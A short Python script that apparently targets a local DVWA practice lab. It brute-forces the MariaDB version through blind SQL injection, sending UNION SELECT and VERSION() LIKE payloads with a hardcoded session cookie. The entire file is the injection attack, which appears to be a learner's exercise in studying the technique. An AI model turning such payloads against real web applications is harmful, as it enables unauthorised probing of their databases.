import MariaDBVersions
import requests

def BruteForceVersion():

    for i in MariaDBVersions.versions:
      print("Trying Version: " + str(i))
      query = "'+UNION SELECT+1,+VERSION()+FROM+users++WHERE VERSION()+LIKE+'%25" + i + "%25'%23"
      url = "http://127.0.0.1/vulnerabilities/sqli_blind/?id=" + query + "+&Submit=Submit#"
      cookie = {"PHPSESSID": "g0e7h2cu7gd1n7o6bqabt9p3r5", "security": "low"}

      request = requests.get(url, cookies=cookie)
      
      if (request.status_code == 200):
        print("Version found: " + str(i))
        break

BruteForceVersion()



